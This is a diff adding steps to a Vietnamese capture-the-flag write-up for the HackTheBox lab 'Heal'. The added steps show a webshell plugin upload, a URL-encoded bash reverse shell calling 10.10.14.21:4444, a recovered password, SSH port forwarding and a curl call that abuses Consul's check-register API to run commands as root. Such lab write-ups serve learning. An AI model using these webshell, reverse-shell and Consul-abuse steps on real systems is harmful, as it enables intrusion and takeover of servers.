@@ -59,18 +59,59 @@ Lúc này thì login được vào `take-survey.heal.htb` với role là admin:
 
 <img width="1909" height="1021" alt="image" src="https://github.com/user-attachments/assets/f0bb707a-f661-4dfd-af2e-a2ac64669ade" />
 
-Sau 1 lúc ngồi mò thì tôi tìm được cái plugin có thể upload thêm vào, từ đây có thể chèn được thêm webshell:
+Sau 1 lúc ngồi mò thì tôi tìm được cái plugin có thể upload thêm vào, từ đây có thể chèn được thêm webshell thông qua [plugin](https://github.com/namdt5125/road_to_hecker/blob/main/Heal/pwn_plugin.zip):
 
 <img width="1912" height="808" alt="image" src="https://github.com/user-attachments/assets/671456e5-c221-4fda-898e-20b714962078" />
 
+Sau khi cài xong plugin thì nó xuất hiện ở đây:
 
+<img width="1911" height="249" alt="image" src="https://github.com/user-attachments/assets/dc8e0d69-4ccd-4933-bcc0-40faad8c5f2b" />
 
+Truy cập vào đây để kích hoạt webshell `http://take-survey.heal.htb/upload/plugins/PwnPlugin/shell.php?cmd=id`:
 
+<img width="713" height="158" alt="image" src="https://github.com/user-attachments/assets/aa373a50-10f3-4912-940e-de94688e5155" />
 
+Chạy reverse shell 
 
+```
+http://take-survey.heal.htb/upload/plugins/PwnPlugin/shell.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.21%2F4444%200%3E%261%27
+```
 
+<img width="857" height="981" alt="image" src="https://github.com/user-attachments/assets/55b0e2c1-791d-4843-a34c-5f9778c97be8" />
 
+Tôi tìm được mật khẩu tại file config.php, sau đó truy cập vào database nhưng không kiếm được gì hữu ích:
 
+<img width="1429" height="909" alt="image" src="https://github.com/user-attachments/assets/6efd248f-03fe-4f3a-b23a-b60ad4f21ac4" />
+
+Ở đây là 2 user là `ron` và `ralph`, tôi thử pass thì được là `ron:AdmiDi0_pA$$w0rd`:
+
+<img width="560" height="122" alt="image" src="https://github.com/user-attachments/assets/d6e711b8-707e-4db2-a964-255b66c95dd6" />
+
+Dùng `ps auxww` và `ss -tulnp` thì tôi thấy có 1 dịch vụ consul đang chạy, tôi thử làm 1 cái trên vmware để xem như nào:
+
+<img width="1877" height="742" alt="image" src="https://github.com/user-attachments/assets/d6c884dc-4b1c-4e18-886a-864ea0608730" />
+
+Tôi dùng `ssh -L 8500:127.0.0.1:8500 ron@10.129.6.53` để nối vào 8500, truy cập vào consul:
+
+<img width="1895" height="955" alt="image" src="https://github.com/user-attachments/assets/c06b6b54-e3b5-40e1-8ef4-bc09638e604c" />
+
+Sau khi tìm hiểu thì api để add thêm service là `http://localhost:8500/v1/agent/check/register`, tôi add thêm service vào:
+
+```
+curl --request PUT \
+  --url http://localhost:8500/v1/agent/check/register \
+  --data '{
+    "ID": "test",
+    "Name": "test",
+    "Notes": "hehe",
+    "DeregisterCriticalServiceAfter": "90m",
+    "Args": ["/usr/bin/cat","root/root.txt"],
+    "Interval": "10s",
+    "Timeout": "5s"
+  }'
+```
+
+<img width="1730" height="1035" alt="image" src="https://github.com/user-attachments/assets/5856ef9b-8000-458f-83b9-3691195e5ad2" />
 
 
 
